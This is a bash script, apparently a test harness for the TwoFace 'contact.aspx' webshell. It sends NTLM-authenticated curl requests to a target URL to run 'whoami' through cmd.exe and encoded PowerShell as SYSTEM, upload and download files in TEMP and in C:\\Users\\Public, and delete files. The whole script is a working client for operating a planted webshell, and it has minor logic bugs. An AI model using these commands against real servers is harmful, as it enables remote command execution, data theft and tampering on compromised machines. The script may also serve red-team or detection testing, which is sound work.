# Tests to check the contact.aspx webshell

auth=true
url=""
user=""
pw=""
curlPre=""
regExp='(?<=AdditionalInfo\"\>).*(?=\<\/pre\>)'

# Get the parameters for the server
printf "[?] Does the webserver use Windows Authentication? (Y/n) "
read authString
if [[ ${authString,,} == "n" ]]; then
	printf "\n[*] Skipping user details.\n"
	auth=false
elif [ -z "$authString" ] || [[ ${authString,,} = "y" ]]; then
	printf "\n[*] Using Authentication.\n"
	printf "[?] Please enter the user in the format domain/user: "
	read user
	printf "[?] Please enter the password: "
	read pw
else
	printf "\n[!] Unrecognized entry, exiting."
	exit 1
fi

printf "[?] Please enter the URL: "
read url

if [[ -z $url ]]; then
	echo "URL is missing, exiting"
	exit 1
fi

if [[ $auth ]]; then
	if [[ -z $user ]] || [[ -z $pw ]]; then
		echo "User or password missing but authorization selected, exiting"
		exit 1
	fi
fi

printf "\n[*] Using the following information:\n   User: $user\n   Password: $pw\n   Server: $url\n\n"

if [ auth ]; then
	curlPre="curl --http1.1 --ntlm -u '$user:$pw' -k -s -X POST "
else
	curlPre="curl -k -s -X POST "
fi

printf "\n************************\n"
printf "* [*] Beginning Tests: *"
printf "\n************************\n"
# COMMAND EXECUTION
printf "[*] Command Execution (cmd) - Expecting nt authority\\system\n"
curlCmd="$curlPre --data \"pro=cmd.exe\" --data \"cmd=whoami\" $url"
resp=$(eval $curlCmd)
content=$(echo $resp | grep -o -P $regExp)
if [[ $content == *'nt authority\system'* ]]; then
	printf "  [OK] CMD Execution working\n"
else
	printf "  [!] FAILED: CMD execution not working or unexpected user returned\n"
fi
sleep 2

printf "[*] Command Execution (PowerShell) - Expecting nt authority\\system\n"
curlCmd="$curlPre --data \"pro=powershell.exe\" --data \"cmd=-e dwBoAG8AYQBtAGkA\" $url"
resp=$(eval $curlCmd)
content=$(echo $resp | grep -o -P $regExp)
if [[ $content == *'nt authority\system'* ]]; then
	printf "  [OK] PowerShell Execution working\n"
else
	printf "  [!] FAILED: PowerShell execution not working or unexpected user returned\n"
fi
sleep 2

# TEMP UPLOAD DOWNLOAD
printf "\n[*] File Upload (TEMP) - Using simple text file (test_file.txt) with content 'test data'\n"
echo 'test data' > twoface_testfile.txt
curlCmd="$curlPre --data \"upd=test_file.txt\" --data \"upb=\$(base64 twoface_testfile.txt)\" $url"
resp=$(eval $curlCmd)
content=$(echo $resp | grep -o -P $regExp)
if [[ $content == *"Success"* ]]; then
	printf "  [OK] File upload succeeded\n"
else
	printf "  [!] FAILED: File upload did not succeed\n"
fi
sleep 2

echo "[*] File Download (TEMP) - Using the previously uploaded file"
curlCmd="$curlPre -o twoface_testfile2.txt --data \"don=test_file.txt\" $url"
resp=$(eval $curlCmd)
content=$(echo $resp | grep -o -P $regExp)
if [[ -f twoface_testfile2.txt ]] && [[ -s twoface_testfile2.txt ]]; then
	printf "  [OK] File download succeeded\n"
else
	printf "  [!] FAILED: File download did not succeed\n"
fi
sleep 2

# ARBITRARY UPLOAD DOWNLOAD
printf "\n[*] File Upload (Arbitrary Path) - Same file, to 'c:/users/public' \n"
curlCmd="$curlPre -F 'upl=f1' -F 'sav=C:\Users\Public\' -F 'vir=false' -F 'nen=test_file.txt' -F 'f1=@twoface_testfile.txt' $url"
resp=$(eval $curlCmd)
content=$(echo $resp | grep -o -P $regExp)
if [[ $content == *"Success"* ]]; then
	printf "  [OK] File upload succeeded\n"
else
	printf "  [!] FAILED: File upload did not succeed\n"
fi
sleep 2

echo "[*] File Download (Arbitrary Path) - Using the previously uploaded file"
curlCmd="$curlPre -o twoface_testfile3.txt --data 'don=c:\users\public\test_file.txt' $url"
resp=$(eval $curlCmd)
content=$(echo $resp | grep -o -P $regExp)
if [[ -f twoface_testfile2.txt ]] && [[ -s twoface_testfile2.txt ]]; then
	printf "  [OK] File download succeeded\n"
else
	printf "  [!] FAILED: File download did not succeed\n"
fi
sleep 2

# FILE DELETES
printf "\n[*] File Delete (TEMP)\n"
curlCmd="$curlPre --data 'del=test_file.txt' $url"
resp=$(eval $curlCmd)
content=$(echo $resp | grep -o -P $regExp)
if [[ $content == *"Deleted"* ]]; then
	printf "  [OK] File delete succeeded\n"
else
	printf "  [!] FAILED: File delete did not succeed\n"
fi
sleep 2

printf "[*] File Delete (Arbitrary Path)\n"
curlCmd="$curlPre --data 'del=c:\users\public\test_file.txt' $url"
resp=$(eval $curlCmd)
content=$(echo $resp | grep -o -P $regExp)
if [[ $content == *"Deleted"* ]]; then
	printf "  [OK] File delete succeeded\n"
else
	printf "  [!] FAILED: File delete did not succeed\n"
fi
sleep 2

# CLEANUP
printf "\n\n[*] Cleaning up locally created files"
rm twoface_testfile.txt
rm twoface_testfile2.txt
rm twoface_testfile3.txt

printf "\n*************************************\n"
echo "[*] Test Complete"